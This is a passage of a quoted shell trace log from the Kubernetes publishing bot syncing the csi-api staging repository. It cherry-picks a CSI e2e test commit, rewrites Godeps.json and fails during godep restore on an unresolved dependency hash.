master ']'\n>\t+ '[' master '!=' master ']'\n>\t+ is-merge 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t++ git show --format=short -q 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t+ return 1\n>\t+ local pick_args=\n>\t+ is-merge 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t+ grep -q '^Merge: '\n>\t++ short-commit-message 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t++ git show --format=short -q 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t+ return 1\n>\t++ commit-subject 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t++ git show --format=%s -q 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\tCherry-picking k8s.io/kubernetes single-commit 4ff1e32974f8434c9eaab18e76eae455956f1d48: Updating CSI e2e test to create CSI CRDs; storing CRD spec in a common location.\n>\t+ echo 'Cherry-picking k8s.io/kubernetes single-commit 4ff1e32974f8434c9eaab18e76eae455956f1d48: Updating CSI e2e test to create CSI CRDs; storing CRD spec in a common location.'\n>\t+ local squash_commits=1\n>\t+ godep-changes 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t+ '[' -n '' ']'\n>\t+ git diff --exit-code --quiet '28b44cb2f1d69864321e9c098c43a72ca2321a38^' 28b44cb2f1d69864321e9c098c43a72ca2321a38 -- Godeps/Godeps.json\n>\t+ reset-godeps '28b44cb2f1d69864321e9c098c43a72ca2321a38^'\n>\t+ local 'f_clean_commit=28b44cb2f1d69864321e9c098c43a72ca2321a38^'\n>\t++ git ls-tree '28b44cb2f1d69864321e9c098c43a72ca2321a38^^{tree}' Godeps\n>\t+ '[' -n '040000 tree aa27a850398102a27c8b9b63447a37b19f2f23fd\tGodeps' ']'\n>\t+ git checkout '28b44cb2f1d69864321e9c098c43a72ca2321a38^' Godeps\n>\t+ git add Godeps\n>\t+ git commit -q -m 'sync: reset Godeps/Godeps.json' --allow-empty\n>\t+ squash_commits=2\n>\t+ dst_needs_godeps_update=true\n>\t++ commit-date 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t++ git show --format=%aD -q 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t+ GIT_COMMITTER_DATE='Wed, 12 Sep 2018 13:41:12 -0700'\n>\t+ git cherry-pick --keep-redundant-commits 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>\t+ squash 2\n>\t++ git rev-parse HEAD\n>\t+ local head=f9dd4a2ac74918017a1e6bddaf81e592b90d928b\n>\t+ git reset -q --soft HEAD~2\n>\t++ committer-date f9dd4a2ac74918017a1e6bddaf81e592b90d928b\n>\t++ git show --format=%cD -q f9dd4a2ac74918017a1e6bddaf81e592b90d928b\n>\t+ GIT_COMMITTER_DATE='Wed, 12 Sep 2018 13:41:12 -0700'\n>\t+ git commit --allow-empty -q -C f9dd4a2ac74918017a1e6bddaf81e592b90d928b\n>\t+ '[' -z 9228bec334fbda3fa201ea5fb3515f9c0781c82d ']'\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n 9228bec334fbda3fa201ea5fb3515f9c0781c82d ']'\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT '!=' 9228bec334fbda3fa201ea5fb3515f9c0781c82d ']'\n>\t+ local dst_parent2=HEAD\n>\t+ '[' master '!=' master ']'\n>\t++ commit-subject 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>\t++ git show --format=%s -q 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>\tCherry-picking source dropped-merge 9228bec334fbda3fa201ea5fb3515f9c0781c82d: Merge pull request #68579 from verult/adc-crd-access.\n>\t+ echo 'Cherry-picking source dropped-merge 9228bec334fbda3fa201ea5fb3515f9c0781c82d: Merge pull request #68579 from verult/adc-crd-access.'\n>\t++ commit-date 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>\t++ git show --format=%aD -q 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>\t+ local 'date=Wed, 19 Sep 2018 02:00:30 -0700'\n>\t+++ commit-message 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>\t+++ git show --format=%B -q 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>\t+++ echo\n>\t+++ echo 'Kubernetes-commit: 9228bec334fbda3fa201ea5fb3515f9c0781c82d'\n>\t++ GIT_COMMITTER_DATE='Wed, 19 Sep 2018 02:00:30 -0700'\n>\t++ GIT_AUTHOR_DATE='Wed, 19 Sep 2018 02:00:30 -0700'\n>\t++ git commit-tree -p 2966180a4e54fab57c98153a33cf018cc4017ba3 -p HEAD -m 'Merge pull request #68579 from verult/adc-crd-access\n>\n>\tUpdating CSI e2e test to create CSI CRDs\n>\n>\tKubernetes-commit: 9228bec334fbda3fa201ea5fb3515f9c0781c82d' 'HEAD^{tree}'\n>\t+ local dst_new_merge=f51ecad0c88523ba381bbf7343561b0d9b1d2139\n>\t+ git reset -q --hard f51ecad0c88523ba381bbf7343561b0d9b1d2139\n>\t+ fix-godeps apimachinery:master,api:master,client-go:master '' k8s.io true true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=apimachinery:master,api:master,client-go:master\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local needs_godeps_update=true\n>\t+ local squash=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=f51ecad0c88523ba381bbf7343561b0d9b1d2139\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps apimachinery:master,api:master,client-go:master k8s.io true Kubernetes-commit\n>\t+ local deps=apimachinery:master,api:master,client-go:master\n>\t+ local base_package=k8s.io\n>\t+ local is_library=true\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/csi-api\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/csi-api/\") or . == \"k8s.io/csi-api\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t# cd /go-workspace/src/k8s.io/apiextensions-apiserver; git checkout xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n>\terror: pathspec 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' did not match any file(s) known to git.\n>\tgodep: error restoring dep (k8s.io/apiextensions-apiserver/pkg/apis/apiextensions): exit status 1\n>\t# cd /go-workspace/src/k8s.io/apiextensions-apiserver; git checkout xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n>\terror: pathspec 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' did not match any file(s) known to git.\n>\tgodep: error restoring dep (k8s.io/apiextensions-apiserver/pkg/apis/apiextensions/v1beta1): exit status 1\n>\t# cd /go-workspace/src/k8s.io/apiextensions-apiserver; git checkout xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n>\terror: pathspec 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' did not match any file(s) known to git.\n>\tgodep: error restoring dep (k8s.io/apiextensions-apiserver/pkg/client/clientset/clientset/scheme): exit status 1\n>\tgodep: Error restoring some deps. Aborting check.\n>[19 Sep 18 10:13 UTC]: exit status 1\n>    \t+ '[' '!' 14 -eq 14 ']'\n>    \t+ REPO=csi-api\n>    \t+ SRC_BRANCH=master\n>    \t+ DST_BRANCH=master\n>    \t+ DEPS=apimachinery:master,api:master,client-go:master\n>    \t+ REQUIRED=\n>    \t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ SUBDIR=staging/src/k8s.io/csi-api\n>    \t+ SOURCE_REPO_ORG=kubernetes\n>    \t+ SOURCE_REPO_NAME=kubernetes\n>    \t+ shift 9\n>    \t+ BASE_PACKAGE=k8s.io\n>    \t+ IS_LIBRARY=true\n>    \t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ SKIP_TAGS=\n>    \t+ LAST_PUBLISHED_UPSTREAM_HASH=400981797e38bee5c1b84f7a1f3914db7b74f196\n>    \t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>    \t++ dirname /publish_scripts/construct.sh\n>    \t+ SCRIPT_DIR=/publish_scripts\n>    \t+ source /publish_scripts/util.sh\n>    \t++ set -o errexit\n>    \t++ set -o nounset\n>    \t++ set -o pipefail\n>    \t++ set -o xtrace\n>    \t+ echo 'Running garbage collection.'\n>    \t+ git gc --auto\n>    \t+ echo 'Fetching from origin.'\n>    \t+ git fetch origin --no-tags --prune\n>    \t+ echo 'Cleaning up checkout.'\n>    \t+ git rebase --abort\n>    \tNo rebase in progress?\n>    \t+ true\n>    \t+ git reset -q --hard\n>    \t+ git clean -q -f -f -d\n>    \t++ git rev-parse HEAD\n>    \t+ git checkout -q 98034ca4f8e262c9587a60b916f73821af1f5e62\n>    \t+ git branch -D master\n>    \t+ git remote set-head origin -d\n>    \t+ git rev-parse origin/master\n>    \t+ echo 'Switching to origin/master.'\n>    \t+ git branch -f master origin/master\n>    \t+ git checkout -q master\n>    \t+ echo 'Fetching upstream changes.'\n>    \t+ git remote\n>    \t+ grep -w -q upstream\n>    \t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>    \t+ git fetch -q upstream --no-tags --prune\n>    \t++ git rev-parse upstream/master\n>    \t+ UPSTREAM_HASH=9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>    \t+ '[' 9228bec334fbda3fa201ea5fb3515f9c0781c82d '!=' 400981797e38bee5c1b84f7a1f3914db7b74f196 ']'\n>    \t+ echo 'Upstream branch upstream/master moved from '\\''400981797e38bee5c1b84f7a1f3914db7b74f196'\\'' to '\\''9228bec334fbda3fa201ea5fb3515f9c0781c82d'\\''. We have to sync.'\n>    \t+ sync_repo kubernetes kubernetes staging/src/k8s.io/csi-api master master apimachinery:master,api:master,client-go:master '' k8s.io true 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local source_repo_org=kubernetes\n>    \t+ local source_repo_name=kubernetes\n>    \t+ local subdirectory=staging/src/k8s.io/csi-api\n>    \t+ local src_branch=master\n>    \t+ local dst_branch=master\n>    \t+ local deps=apimachinery:master,api:master,client-go:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ shift 9\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ readonly subdirectory src_branch dst_branch deps is_library\n>    \t+ local new_branch=false\n>    \t+ local orphan=false\n>    \t+ git rev-parse -q --verify HEAD\n>    \t++ ls -1\n>    \t++ wc -l\n>    \t+ '[' 10 = 0 ']'\n>    \t++ git rev-parse HEAD\n>    \t+ echo 'Starting at existing master commit 2966180a4e54fab57c98153a33cf018cc4017ba3.'\n>    \t+ git branch -D filtered-branch\n>    \t+ git branch -f upstream-branch upstream/master\n>    \t++ git rev-parse upstream-branch\n>    \t+ echo 'Checked out source commit 9228bec334fbda3fa201ea5fb3515f9c0781c82d.'\n>    \t+ git checkout -q upstream-branch -b filtered-branch\n>    \t+ git reset -q --hard upstream-branch\n>    \t+ local f_mainline_commits=\n>    \t+ '[' false = true ']'\n>    \t+ '[' false = true ']'\n>    \t++ last-kube-commit Kubernetes-commit master\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B master\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t++ head -n 1\n>    \t+ local k_base_commit=f26556cc14e2a01a1904805566e082484c1f33f9\n>    \t+ '[' -z f26556cc14e2a01a1904805566e082484c1f33f9 ']'\n>    \t++ git-find-merge f26556cc14e2a01a1904805566e082484c1f33f9 upstream/master\n>    \t++ tail -1\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list 'f26556cc14e2a01a1904805566e082484c1f33f9^1..upstream/master' --first-parent\n>    \t+++ git rev-list f26556cc14e2a01a1904805566e082484c1f33f9..upstream/master --ancestry-path\n>    \t+++ git rev-parse f26556cc14e2a01a1904805566e082484c1f33f9\n>    \t+ local k_base_merge=f26556cc14e2a01a1904805566e082484c1f33f9\n>    \t+ '[' -z f26556cc14e2a01a1904805566e082484c1f33f9 ']'\n>    \t+ git branch -f filtered-branch-base f26556cc14e2a01a1904805566e082484c1f33f9\n>    \t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/csi-api.'\n>    \t+ filter-branch Kubernetes-commit staging/src/k8s.io/csi-api 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local subdirectory=staging/src/k8s.io/csi-api\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ echo 'Running git filter-branch ...'\n>    \t+ local index_filter=\n>    \t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ patterns=()\n>    \t+ local patterns\n>    \t+ local p=\n>    \t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>    \t+ IFS=' '\n>    \t+ read -ra patterns\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>    \t+ for p in '\"${patterns[@]}\"'\n>    \t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>    \t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/csi-api -- filtered-branch filtered-branch-base\n>    \t++ git rev-parse filtered-branch-base\n>    \t+ local f_base_commit=bb43bf9865caef91f64f123f91eb7b66501b59eb\n>    \t++ git log --first-parent --format=%H --reverse bb43bf9865caef91f64f123f91eb7b66501b59eb..HEAD\n>    \t+ f_mainline_commits=28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t+ echo 'Checking out branch master.'\n>    \t+ git checkout -q master\n>    \t+ '[' -f kubernetes-sha ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_head=2966180a4e54fab57c98153a33cf018cc4017ba3\n>    \t+ local k_pending_merge_commit=\n>    \t+ local dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_merge_point_commit=2966180a4e54fab57c98153a33cf018cc4017ba3\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' 28b44cb2f1d69864321e9c098c43a72ca2321a38 = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t++ kube-commit Kubernetes-commit 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ commit-message 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t++ git show --format=%B -q 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ k_mainline_commit=4ff1e32974f8434c9eaab18e76eae455956f1d48\n>    \t++ git-find-merge 4ff1e32974f8434c9eaab18e76eae455956f1d48 upstream-branch\n>    \t++ tail -1\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list '4ff1e32974f8434c9eaab18e76eae455956f1d48^1..upstream-branch' --first-parent\n>    \t+++ git rev-list 4ff1e32974f8434c9eaab18e76eae455956f1d48..upstream-branch --ancestry-path\n>    \t+++ git rev-parse 4ff1e32974f8434c9eaab18e76eae455956f1d48\n>    \t+ k_new_pending_merge_commit=9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>    \t+ '[' 9228bec334fbda3fa201ea5fb3515f9c0781c82d = 4ff1e32974f8434c9eaab18e76eae455956f1d48 ']'\n>    \t+ '[' master '!=' master ']'\n>    \t+ '[' -n '' ']'\n>    \t+ k_pending_merge_commit=9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>    \t+ '[' 28b44cb2f1d69864321e9c098c43a72ca2321a38 = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ '[' master '!=' master ']'\n>    \t+ '[' master '!=' master ']'\n>    \t+ is-merge 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t+ grep -q '^Merge: '\n>    \t++ short-commit-message 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t++ git show --format=short -q 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t+ return 1\n>    \t+ local pick_args=\n>    \t+ is-merge 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t+ grep -q '^Merge: '\n>    \t++ short-commit-message 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t++ git show --format=short -q 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t+ return 1\n>    \t++ commit-subject 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t++ git show --format=%s -q 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t+ echo 'Cherry-picking k8s.io/kubernetes single-commit 4ff1e32974f8434c9eaab18e76eae455956f1d48: Updating CSI e2e test to create CSI CRDs; storing CRD spec in a common location.'\n>    \t+ local squash_commits=1\n>    \t+ godep-changes 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t+ '[' -n '' ']'\n>    \t+ git diff --exit-code --quiet '28b44cb2f1d69864321e9c098c43a72ca2321a38^' 28b44cb2f1d69864321e9c098c43a72ca2321a38 -- Godeps/Godeps.json\n>    \t+ reset-godeps '28b44cb2f1d69864321e9c098c43a72ca2321a38^'\n>    \t+ local 'f_clean_commit=28b44cb2f1d69864321e9c098c43a72ca2321a38^'\n>    \t++ git ls-tree '28b44cb2f1d69864321e9c098c43a72ca2321a38^^{tree}' Godeps\n>    \t+ '[' -n '040000 tree aa27a850398102a27c8b9b63447a37b19f2f23fd\tGodeps' ']'\n>    \t+ git checkout '28b44cb2f1d69864321e9c098c43a72ca2321a38^' Godeps\n>    \t+ git add Godeps\n>    \t+ git commit -q -m 'sync: reset Godeps/Godeps.json' --allow-empty\n>    \t+ squash_commits=2\n>    \t+ dst_needs_godeps_update=true\n>    \t++ commit-date 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t++ git show --format=%aD -q 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t+ GIT_COMMITTER_DATE='Wed, 12 Sep 2018 13:41:12 -0700'\n>    \t+ git cherry-pick --keep-redundant-commits 28b44cb2f1d69864321e9c098c43a72ca2321a38\n>    \t+ squash 2\n>    \t++ git rev-parse HEAD\n>    \t+ local head=f9dd4a2ac74918017a1e6bddaf81e592b90d928b\n>    \t+ git reset -q --soft HEAD~2\n>    \t++ committer-date f9dd4a2ac74918017a1e6bddaf81e592b90d928b\n>    \t++ git show --format=%cD -q f9dd4a2ac74918017a1e6bddaf81e592b90d928b\n>    \t+ GIT_COMMITTER_DATE='Wed, 12 Sep 2018 13:41:12 -0700'\n>    \t+ git commit --allow-empty -q -C f9dd4a2ac74918017a1e6bddaf81e592b90d928b\n>    \t+ '[' -z 9228bec334fbda3fa201ea5fb3515f9c0781c82d ']'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n 9228bec334fbda3fa201ea5fb3515f9c0781c82d ']'\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT '!=' 9228bec334fbda3fa201ea5fb3515f9c0781c82d ']'\n>    \t+ local dst_parent2=HEAD\n>    \t+ '[' master '!=' master ']'\n>    \t++ commit-subject 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>    \t++ git show --format=%s -q 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>    \t+ echo 'Cherry-picking source dropped-merge 9228bec334fbda3fa201ea5fb3515f9c0781c82d: Merge pull request #68579 from verult/adc-crd-access.'\n>    \t++ commit-date 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>    \t++ git show --format=%aD -q 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>    \t+ local 'date=Wed, 19 Sep 2018 02:00:30 -0700'\n>    \t+++ commit-message 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>    \t+++ git show --format=%B -q 9228bec334fbda3fa201ea5fb3515f9c0781c82d\n>    \t+++ echo\n>    \t+++ echo 'Kubernetes-commit: 9228bec334fbda3fa201ea5fb3515f9c0781c82d'\n>    \t++ GIT_COMMITTER_DATE='Wed, 19 Sep 2018 02:00:30 -0700'\n>    \t++ GIT_AUTHOR_DATE='Wed, 19 Sep 2018 02:00:30 -0700'\n>    \t++ git commit-tree -p 2966180a4e54fab57c98153a33cf018cc4017ba3 -p HEAD -m 'Merge pull request #68579 from verult/adc-crd-access\n>\n>    \tUpdating CSI e2e test to create CSI CRDs\n>\n>    \tKubernetes-commit: 9228bec334fbda3fa201ea5fb3515f9c0781c82d' 'HEAD^{tree}'\n>    \t+ local dst_new_merge=f51ecad0c88523ba381bbf7343561b0d9b1d2139\n>    \t+ git reset -q --hard f51ecad0c88523ba381bbf7343561b0d9b1d2139\n>    \t+ fix-godeps apimachinery:master,api:master,client-go:master '' k8s.io true true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=apimachinery:master,api:master,client-go:master\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=f51ecad0c88523ba381bbf7343561b0d9b1d2139\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps apimachinery:master,api:master,client-go:master k8s.io true Kubernetes-commit\n>    \t+ local deps=apimachinery:master,api:master,client-go:master\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/csi-api\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/apimachinery/\") or . == \"k8s.io/apimachinery\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/api/\") or . == \"k8s.io/api\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/client-go/\") or . == \"k8s.io/client-go\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/csi-api/\") or . == \"k8s.io/csi-api\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \t# cd /go-workspace/src/k8s.io/apiextensions-apiserver; git checkout xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n>    \terror: pathspec 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' did not match any file(s) known to git.\n>    \tgodep: error restoring dep (k8s.io/apiextensions-apiserver/pkg/apis/apiextensions): exit status 1\n>    \t# cd /go-workspace/src/k8s.io/apiextensions-apiserver; git checkout xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\n>    \terror: pathspec 